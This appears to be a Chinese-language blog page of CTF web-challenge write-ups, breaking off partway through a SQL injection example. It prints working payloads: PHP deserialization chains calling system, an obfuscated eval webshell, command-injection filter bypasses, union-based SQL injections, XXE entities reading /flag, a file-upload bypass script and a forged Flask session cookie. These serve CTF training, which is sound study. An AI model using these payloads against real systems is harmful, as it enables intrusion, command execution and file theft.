<!-- build time:Wed Jun 18 2025 15:25:34 GMT+0800 (中国标准时间) --><!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=2"><meta name="theme-color" content="#FFF"><link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png"><link rel="icon" type="image/ico" sizes="32x32" href="/images/favicon.ico"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><link rel="alternate" type="application/rss+xml" title="ililiiY" href="https://lookhui.github.io/rss.xml"><link rel="alternate" type="application/atom+xml" title="ililiiY" href="https://lookhui.github.io/atom.xml"><link rel="alternate" type="application/json" title="ililiiY" href="https://lookhui.github.io/feed.json"><link rel="stylesheet" href="//fonts.googleapis.com/css?family=Mulish:300,300italic,400,400italic,700,700italic%7CFredericka%20the%20Great:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20JP:300,300italic,400,400italic,700,700italic%7CNoto%20Serif%20SC:300,300italic,400,400italic,700,700italic%7CInconsolata:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext"><link rel="stylesheet" href="/css/app.css?v=0.2.5"><meta name="keywords" content="WEB"><link rel="canonical" href="https://lookhui.github.io/WEB%E5%88%B7%E9%A2%98-md/"><title>WEB刷题解析 - WEB | look-hui = ililiiY = lookhui</title><meta name="generator" content="Hexo 7.2.0"></head><body itemscope itemtype="http://schema.org/WebPage"><div id="loading"><div class="cat"><div class="body"></div><div class="head"><div class="face"></div></div><div class="foot"><div class="tummy-end"></div><div class="bottom"></div><div class="legs left"></div><div class="legs right"></div></div><div class="paw"><div class="hands left"></div><div class="hands right"></div></div></div></div><div id="container"><header id="header" itemscope itemtype="http://schema.org/WPHeader"><div class="inner"><div id="brand"><div class="pjax"><h1 itemprop="name headline">WEB刷题解析</h1><div class="meta"><span class="item" title="创建时间：2023-12-12 21:39:15"><span class="icon"><i class="ic i-calendar"></i> </span><span class="text">发表于</span> <time itemprop="dateCreated datePublished" datetime="2023-12-12T21:39:15+08:00">2023-12-12</time></span></div></div></div><nav id="nav"><div class="inner"><div class="toggle"><div class="lines" aria-label="切换导航栏"><span class="line"></span> <span class="line"></span> <span class="line"></span></div></div><ul class="menu"><li class="item title"><a href="/" rel="start">look-hui</a></li></ul><ul class="right"><li class="item theme"><i class="ic i-sun"></i></li><li class="item search"><i class="ic i-search"></i></li></ul></div></nav></div><div id="imgs" class="pjax"><ul><li class="item" data-background-image="https://www.loliapi.com/acg/?682367"></li><li class="item" data-background-image="https://www.loliapi.com/acg/?462885"></li><li class="item" data-background-image="https://www.loliapi.com/acg/?203226"></li><li class="item" data-background-image="https://www.loliapi.com/acg/?187233"></li><li class="item" data-background-image="https://www.loliapi.com/acg/?536038"></li><li class="item" data-background-image="https://www.loliapi.com/acg/?683964"></li></ul></div></header><div id="waves"><svg class="waves" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" viewBox="0 24 150 28" preserveAspectRatio="none" shape-rendering="auto"><defs><path id="gentle-wave" d="M-160 44c30 0 58-18 88-18s 58 18 88 18 58-18 88-18 58 18 88 18 v44h-352z"/></defs><g class="parallax"><use xlink:href="#gentle-wave" x="48" y="0"/><use xlink:href="#gentle-wave" x="48" y="3"/><use xlink:href="#gentle-wave" x="48" y="5"/><use xlink:href="#gentle-wave" x="48" y="7"/></g></svg></div><main><div class="inner"><div id="main" class="pjax"><div class="article wrap"><div class="breadcrumb" itemscope itemtype="https://schema.org/BreadcrumbList"><i class="ic i-home"></i> <span><a href="/">首页</a></span><i class="ic i-angle-right"></i> <span class="current" itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem"><a href="/categories/WEB/" itemprop="item" rel="index" title="分类于 WEB"><span itemprop="name">WEB</span></a><meta itemprop="position" content="1"></span></div><article itemscope itemtype="http://schema.org/Article" class="post block" lang="zh-CN"><link itemprop="mainEntityOfPage" href="https://lookhui.github.io/WEB%E5%88%B7%E9%A2%98-md/"><span hidden itemprop="author" itemscope itemtype="http://schema.org/Person"><meta itemprop="image" content="/images/avatar.jpg"><meta itemprop="name" content="c0iq"><meta itemprop="description" content="lookhui, 坚持与努力"></span><span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization"><meta itemprop="name" content="ililiiY"></span><div class="body md" itemprop="articleBody"><h5 id="hznuctf-2023-preliminaryppppop"><a class="anchor" href="#hznuctf-2023-preliminaryppppop">#</a> [HZNUCTF 2023 preliminary]ppppop</h5><p>打开页面没有显示东西打开 f12 查看网络有一个 cookie:user 尝试将字符串进行 base64 解密发现是一个验证已经显示是 isadmin 那么在让他变成 1 就行，然后输入 header 里面去查看到源码就是一个反序列化，我们要注意的是 strrev 和 python 的 [::-1] 一样将字符串反转</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class A &#123;</span><br><span class="line">    public $className=&quot;B&quot;;</span><br><span class="line">    public $funcName=&quot;system&quot;;</span><br><span class="line">    public $args=&quot;env&quot;;</span><br><span class="line"></span><br><span class="line">    public function __destruct() &#123;</span><br><span class="line">        $class = new $this-&gt;className;</span><br><span class="line">        $funcName = $this-&gt;funcName;</span><br><span class="line">        $class-&gt;$funcName($this-&gt;args);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class B &#123;</span><br><span class="line">    public function __call($func, $arg) &#123;</span><br><span class="line">        $func($arg[0]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$a=new A();</span><br><span class="line">echo strrev(serialize($a));</span><br></pre></td></tr></table></figure><p></p><h5 id="hznuctf-2023-preliminaryguessguessguess"><a class="anchor" href="#hznuctf-2023-preliminaryguessguessguess">#</a> [HZNUCTF 2023 preliminary]guessguessguess</h5><p>很简单直接使用 python 的 [::-1] 即可得到 strrev 反过来的，<br>贴上源码这个题我打不开环境</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">  $userArr = array(&quot;username: admin&lt;br&gt;password: admin&quot;,&quot;username: docker&lt;br&gt;password: docker&quot;, &quot;username: mxx307&lt;br&gt;password: mxxxxxxx3333000777&quot;, &quot;username: FLAG_IN_HERE&lt;br&gt;password: 不给你看&quot;);</span><br><span class="line"></span><br><span class="line">$cmd = strrev($_POST[&#x27;cmd&#x27;]);</span><br><span class="line">if($cmd != &#x27;hint&#x27; &amp;&amp; $cmd != &#x27;phpinfo&#x27;)&#123;</span><br><span class="line">  echo &quot;your SQL: SELECT * FROM users WHERE id=$cmd&quot;;</span><br><span class="line">  echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">&#125;</span><br><span class="line">if($cmd == &quot;phpinfo&quot;) &#123;</span><br><span class="line">  eval(&#x27;phpinfo();&#x27;);</span><br><span class="line">&#125; else if(preg_match(&#x27;/127.0.0.1/&#x27;,$cmd) &amp;&amp; !preg_match(&#x27;/;|&amp;/&#x27;,$cmd )) &#123;</span><br><span class="line">  system(&#x27;ping &#x27;.$cmd);</span><br><span class="line">&#125; else if($cmd == &quot;hint&quot;) &#123;</span><br><span class="line">  echo &#x27;可爱的CTFer哟,你掉的是这个金&quot;命令执行&quot;,还是这个银&quot;XSS&quot;还是这个普通的&quot;SQL注入&quot;呢?&#x27;;</span><br><span class="line">&#125;else if(preg_match(&#x27;/^\d$/&#x27;,$cmd, $matches)) &#123;</span><br><span class="line">  if($matches[0] &lt;= 4 &amp;&amp; $matches[0] &gt;= 1)&#123;</span><br><span class="line">    echo $userArr[$matches[0] - 1];</span><br><span class="line">  &#125; else &#123;</span><br><span class="line">    echo &quot;no user&quot;;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">  echo &quot;猜猜猜&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><h5 id="fsctf-2023webshell是啥捏"><a class="anchor" href="#fsctf-2023webshell是啥捏">#</a> [FSCTF 2023] webshell 是啥捏</h5><p>很简单的一个题直接把</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">highlight_file(__FILE__);  </span><br><span class="line">$😀=&quot;a&quot;;  </span><br><span class="line">$😁=&quot;b&quot;;  </span><br><span class="line">$😂=&quot;c&quot;;  </span><br><span class="line">$🤣=&quot;d&quot;;  </span><br><span class="line">$😃=&quot;e&quot;;  </span><br><span class="line">$😄=&quot;f&quot;;  </span><br><span class="line">$😅=&quot;g&quot;;  </span><br><span class="line">$😆=&quot;h&quot;;  </span><br><span class="line">$😉=&quot;i&quot;;  </span><br><span class="line">$😊=&quot;j&quot;;  </span><br><span class="line">$😋=&quot;k&quot;;  </span><br><span class="line">$😎=&quot;l&quot;;  </span><br><span class="line">$😍=&quot;m&quot;;  </span><br><span class="line">$😘=&quot;n&quot;;  </span><br><span class="line">$😗=&quot;o&quot;;  </span><br><span class="line">$😙=&quot;p&quot;;  </span><br><span class="line">$😚=&quot;q&quot;;  </span><br><span class="line">$🙂=&quot;r&quot;;  </span><br><span class="line">$🤗=&quot;s&quot;;  </span><br><span class="line">$🤩=&quot;t&quot;;  </span><br><span class="line">$🤔=&quot;u&quot;;  </span><br><span class="line">$🤨=&quot;v&quot;;  </span><br><span class="line">$😐=&quot;w&quot;;  </span><br><span class="line">$😑=&quot;x&quot;;  </span><br><span class="line">$😶=&quot;y&quot;;  </span><br><span class="line">$🙄=&quot;z&quot;;  </span><br><span class="line">  </span><br><span class="line">$😭 = $😙. $😀. $🤗. $🤗. $🤩. $😆. $🙂. $🤔;  </span><br><span class="line">  </span><br><span class="line">if (isset($_GET[&#x27;👽&#x27;])) &#123;  </span><br><span class="line">    eval($😭($_GET[&#x27;👽&#x27;]));  </span><br><span class="line">&#125;;  </span><br><span class="line">  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p></p><p>拿去解析一下就能知道这个😭是什么意思然后直接使用👽=cat /flag.txt 即可</p><h5 id="湖湘杯-2021-finalpenetratable"><a class="anchor" href="#湖湘杯-2021-finalpenetratable">#</a> [湖湘杯 2021 final] Penetratable</h5><p>这个题对我来说真的有难度，这个题的步骤是这样的，一开始进行目录扫描，扫到了 phpinfo.php 和一些没有用的，看源码 static 可以看到很多 js 代码，这些 js 代码里面有一个 req 可以查看到账号信息和调用函数，知道了 admin 账号能够修改账号密码，root 用户能够下载文件，user 和 app 用户什么都干不了，那我们首先的目标是是看 admin 上面有没有突破口了。经过多次尝试可以使用 admin&quot;# 来创建用户冒牌一下 admin 账号然后修改 admin 的账号密码就能登录 admin 了，然后通过 admin 来修改 root 账号的密码 name 要 base64 加密，newpass 要 md5 加密 old 也是 md5，然后 pass 要 base64，修改成功后登录 root 账号查看 phpinfo 的内容满足 pass 里面的 get 然后利用下面那个执行命令，发现 catflag 没有权限 flag 文件权限比较高，我们使用 find 查看一下什么有权限查看到了 sed 可以使用，即可得到 flag 如 sed ‘p1’ /flag</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">function updatePass()&#123;</span><br><span class="line">    // let name=encodeURIComponent(Base64.encode($(&quot;.input-group&gt;input&quot;).eq(0).val()))</span><br><span class="line">    // let oldPass=$(&quot;.input-group&gt;input&quot;).eq(1).val()?hex_md5($(&quot;.input-group&gt;input&quot;).eq(1).val()):&#x27;&#x27;;</span><br><span class="line">    // let newPass=$(&quot;.input-group&gt;input&quot;).eq(2).val()?hex_md5($(&quot;.input-group&gt;input&quot;).eq(2).val()):&#x27;&#x27;;</span><br><span class="line">    // let saying=encodeURIComponent(Base64.encode($(&quot;.input-group&gt;input&quot;).eq(3).val()))</span><br><span class="line">    // $.ajax(&#123;</span><br><span class="line">    //     url: &#x27;/?c=admin&amp;m=updatePass&#x27;,</span><br><span class="line">    //     type: &#x27;post&#x27;,</span><br><span class="line">    //     data: &#x27;name=&#x27;+name+&#x27;&amp;newPass=&#x27;+newPass+&#x27;&amp;oldPass=&#x27;+oldPass+&#x27;&amp;saying=&#x27;+saying,</span><br><span class="line">    //     // async:true,</span><br><span class="line">    //     dataType: &#x27;text&#x27;,</span><br><span class="line">    //     success: function(data)&#123;</span><br><span class="line">    //         alertHandle(data);</span><br><span class="line">    //     &#125;</span><br><span class="line">    // &#125;);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><h5 id="nssround13-basicflaskjwt"><a class="anchor" href="#nssround13-basicflaskjwt">#</a> [NSSRound#13 Basic]flask?jwt?</h5><p>题目告诉的很直白，就是 jwt 伪造，你使用常规方法直接进行伪造即可把 id 改为 1</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python flask_session_cookie_manager3.py encode -c &quot;.eJwlzjEOwyAMBdC7MHewDQSTy0QY-6tdSTNVvXsjdX7L-6QDK85n2t_rikc6Xp72tHmTETEyuJSKqdypOZSUkatgRDMDKDAKK7oP0YYpRnNwc-79VqMhUChXEHNlabNWLTmrqAtvpiiNuumEmnJkJ3Zwdu_pjlxnrP9G0vcHIa0wBg.ZVRcxg.NZTyqvJ1HndRRn26eNYQ0gJryU8&quot;</span><br></pre></td></tr></table></figure><p></p><p>[GWCTF 2019] 枯燥的抽奖</p><p>使用</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">str1=&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br><span class="line">str2 = &#x27;iiOj12Cfzb&#x27;</span><br><span class="line">res = &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">for char in str2:</span><br><span class="line">    index = str1.find(char)</span><br><span class="line">    res += str(index) + &#x27; &#x27; + str(index) + &#x27; &#x27; + &#x27;0&#x27; + &#x27; &#x27; + str(len(str1) - 1) + &#x27; &#x27;</span><br><span class="line"></span><br><span class="line">print(res)</span><br></pre></td></tr></table></figure><p></p><p>得到序列在通过 php_rand 去爆破种子得到种子在通过他得加密方法就可得到 $str</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(61046797);</span><br><span class="line">$str_long1 = &quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;;</span><br><span class="line">$str=&#x27;&#x27;;</span><br><span class="line">$len1=20;</span><br><span class="line">for ( $i = 0; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $str.=substr($str_long1, mt_rand(0, strlen($str_long1) - 1), 1);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($str, 0, 10);</span><br><span class="line">echo &quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;.$str_show.&quot;&lt;/p&gt;&quot;;</span><br></pre></td></tr></table></figure><p></p><h5 id="fsctf-2023细狗20"><a class="anchor" href="#fsctf-2023细狗20">#</a> [FSCTF 2023] 细狗 2.0</h5><p>直接使用 1;ls 可以发现有内容，然后使用 ls / 不行代表空格不能使用，那么我们使用 ${IFS} 来代替空格，然后在使用 cat 发现也不行要么使用 c\at 要么使用 nl 即可然后就可以利用正则来匹配如 /f*</p><h5 id="moectf-2021do-you-know-http"><a class="anchor" href="#moectf-2021do-you-know-http">#</a> [MoeCTF 2021]Do you know HTTP</h5><p>使用常规 header 即可得到 flag，注意我得 burp 不知道为什么发送这种请求只有第一次可以</p><h5 id="nssctf-2022-spring-recruitbabysql"><a class="anchor" href="#nssctf-2022-spring-recruitbabysql">#</a> [NSSCTF 2022 Spring Recruit]babysql</h5><p>使用常规 sql 注入发现不行并且提示了给了我们一个说明过滤符号不行，那我们可以尝试一下其他办法比如我这里使用了</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">-a&#x27;/**/union/**/select/**/(select/**/database())&#x27;</span><br><span class="line"></span><br><span class="line">-a&#x27;/**/union/**/select/**/(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&#x27;test&#x27;)&#x27;</span><br><span class="line"></span><br><span class="line">-a&#x27;/**/union/**/select/**/(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&#x27;flag&#x27;)&#x27;</span><br><span class="line"></span><br><span class="line">-a&#x27;/**/union/**/select/**/(select/**/group_concat(flag)/**/from/**/test.flag)&#x27;</span><br></pre></td></tr></table></figure><p></p><h5 id="羊城杯-2020blackcat"><a class="anchor" href="#羊城杯-2020blackcat">#</a> [羊城杯 2020] Blackcat</h5><p>下载音频使用 010 才能查看到源码，看到源码后可以发现漏洞函数使用</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Black-Cat-Sheriff=04b13fc0dff07413856e54695eb6a763878cd1934c503784fe6e24b7e8cdb1b6</span><br><span class="line">&amp;White-cat-monitor[]=1&amp;One-ear=;cat flag.php</span><br></pre></td></tr></table></figure><p></p><h5 id="hubuctf-2022-新生赛ezsql"><a class="anchor" href="#hubuctf-2022-新生赛ezsql">#</a> [HUBUCTF 2022 新生赛] ezsql</h5><p>admin 账号爆破密码为 iamcool 即可得到 flag 或者<br>整体思路为 update 注入，常见于修改用户数据的场景<br>这里注入并不需要单引号，直接拼凑 sql 语句<br>结合 updata 特性，常规操作爆一爆字段，表，列<br>拿不到 admin 密码就修改<br>（flag 在 description 中，为避免重开环境，可在 nickname 回显）</p><h5 id="hnctf-2022-week2easy_unser"><a class="anchor" href="#hnctf-2022-week2easy_unser">#</a> [HNCTF 2022 WEEK2]easy_unser</h5><p>考点在于利用初始化函数来绕过</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">class body&#123;</span><br><span class="line"></span><br><span class="line">    private $want,$todonothing = &quot;&quot;;</span><br><span class="line"></span><br><span class="line">    public function  __construct($want)&#123;</span><br><span class="line">        $About_me = &quot;&quot;;</span><br><span class="line">        if($want !== &quot; &quot;) $this-&gt;want = $want;</span><br><span class="line">        else $this-&gt;want = $this-&gt;todonothing;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$f = &quot;php://filter/convert.base64-encode/resource=f14g.php&quot;;</span><br><span class="line">// 伪协议可以绕过is_file()函数, 并且还不等于f14g.php</span><br><span class="line">$a = new body($f);</span><br><span class="line">$b = serialize($a);</span><br><span class="line">$c = preg_replace(&quot;/:2:&#123;/&quot;,&quot;:3:&#123;&quot;,$b);</span><br><span class="line">echo urlencode($c);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p></p><h5 id="sctf-2021loginme"><a class="anchor" href="#sctf-2021loginme">#</a> [SCTF 2021]loginme</h5><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">查看结构体里面的使用X-Real-ip来伪造本地ip然后使用查看源码结构题能看出他的id=0,age=一个模块</span><br><span class="line">使用age=&#123;&#123;.Password&#125;&#125;可以得到flag</span><br></pre></td></tr></table></figure><p></p><h5 id="fsctf-2023ez_eval"><a class="anchor" href="#fsctf-2023ez_eval">#</a> [FSCTF 2023]EZ_eval</h5><p>使用</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script%0alanguage=&#x27;php&#x27;&gt;system(&#x27;c\at$&#123;IFS&#125;/f*&#x27;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p></p><p>过滤了空格和注意他的 &lt;? 即可绕过<br>新知识 paste 可以查看文件</p><h5 id="csawqual-2019unagi"><a class="anchor" href="#csawqual-2019unagi">#</a> [CSAWQual 2019]Unagi</h5><p>页面一直在提示这是一个 xml 上传漏洞并且 flag 就在 /flag 那，那直接构造恶意 xxe 试试</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span><br><span class="line">&lt;!DOCTYPE users [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot; &gt;]&gt;</span><br><span class="line">&lt;users&gt;</span><br><span class="line">    &lt;user&gt;</span><br><span class="line">        &lt;username&gt;bob&lt;/username&gt;</span><br><span class="line">        &lt;password&gt;passwd2&lt;/password&gt;</span><br><span class="line">        &lt;name&gt; Bob&lt;/name&gt;</span><br><span class="line">        &lt;email&gt;bob@fakesite.com&lt;/email&gt;  </span><br><span class="line">        &lt;group&gt;CSAW2019&lt;/group&gt;</span><br><span class="line">        &lt;intro&gt;&amp;xxe;&lt;/intro&gt;</span><br><span class="line">    &lt;/user&gt;</span><br><span class="line">&lt;/users&gt;</span><br></pre></td></tr></table></figure><p></p><p>直接报错不行<br>那么使用加密试试</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">&lt; ? x m l   v e r s i o n = &#x27; 1 . 0 &#x27; ? &gt; </span><br><span class="line"></span><br><span class="line">&lt; ! D O C T Y P E   u s e r s   [ </span><br><span class="line"></span><br><span class="line">&lt; ! E N T I T Y   x x e   S Y S T E M   &quot; f i l e : / / / f l a g &quot;   &gt; ] &gt; </span><br><span class="line"></span><br><span class="line">&lt; u s e r s &gt; </span><br><span class="line"></span><br><span class="line">        &lt; u s e r &gt; </span><br><span class="line"></span><br><span class="line">                &lt; u s e r n a m e &gt; b o b &lt; / u s e r n a m e &gt; </span><br><span class="line"></span><br><span class="line">                &lt; p a s s w o r d &gt; p a s s w d 2 &lt; / p a s s w o r d &gt; </span><br><span class="line"></span><br><span class="line">                &lt; n a m e &gt;   B o b &lt; / n a m e &gt; </span><br><span class="line"></span><br><span class="line">                &lt; e m a i l &gt; b o b @ f a k e s i t e . c o m &lt; / e m a i l &gt;     </span><br><span class="line"></span><br><span class="line">                &lt; g r o u p &gt; C S A W 2 0 1 9 &lt; / g r o u p &gt; </span><br><span class="line"></span><br><span class="line">                &lt; i n t r o &gt; &amp; x x e ; &lt; / i n t r o &gt; </span><br><span class="line"></span><br><span class="line">        &lt; / u s e r &gt; </span><br><span class="line"></span><br><span class="line">&lt; / u s e r s &gt;</span><br></pre></td></tr></table></figure><p></p><p>直接得到 flag</p><h5 id="nssctf-2ndphp签到"><a class="anchor" href="#nssctf-2ndphp签到">#</a> [NSSCTF 2nd] php 签到</h5><p>注意查看代码</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">  </span><br><span class="line">function waf($filename)&#123;    $black_list = array(&quot;ph&quot;, &quot;htaccess&quot;, &quot;ini&quot;);   </span><br><span class="line">$ext = pathinfo($filename, PATHINFO_EXTENSION);  </span><br><span class="line">    foreach ($black_list as $value) &#123;  </span><br><span class="line">        if (stristr($ext, $value))&#123;  </span><br><span class="line">            return false;  </span><br><span class="line">        &#125;  </span><br><span class="line">    &#125;  </span><br><span class="line">    return true;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line">if(isset($_FILES[&#x27;file&#x27;]))&#123;    $filename = urldecode($_FILES[&#x27;file&#x27;][&#x27;name&#x27;]);    $content = file_get_contents($_FILES[&#x27;file&#x27;][&#x27;tmp_name&#x27;]);  </span><br><span class="line">    if(waf($filename))&#123;        file_put_contents($filename, $content);  </span><br><span class="line">    &#125; else &#123;  </span><br><span class="line">        echo &quot;Please re-upload&quot;;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125; else&#123;    highlight_file(__FILE__);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p></p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">url=&quot;http://node5.anna.nssctf.cn:28748/&quot;</span><br><span class="line"></span><br><span class="line">file_content = &quot;&lt;?php phpinfo();?&gt;&quot;</span><br><span class="line"></span><br><span class="line">file = &#123;&#x27;file&#x27;: (&#x27;1.php%2f.&#x27;, file_content)&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, files=file)</span><br><span class="line"></span><br><span class="line">print(response.text)</span><br></pre></td></tr></table></figure><p></p><p>直接使用这个即可上传一个 1.php/. 上去</p><h5 id="october-2019twice-sql-injection"><a class="anchor" href="#october-2019twice-sql-injection">#</a> [October 2019]Twice SQL Injection</h5><p>二次注入，注入点在那个注册哪里然后到 login 那里面实现注入，首先需要</p><p></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; union select database()# </span><br><span class="line">1&#x27; union select group_concat(table_name) from information_schema.tables where database()=table_schema# </span><br><span class="line">1&#x27; union select group_concat(column_name) from information_schema.columns where table_name=&quot;flag&quot;# </span><br><span 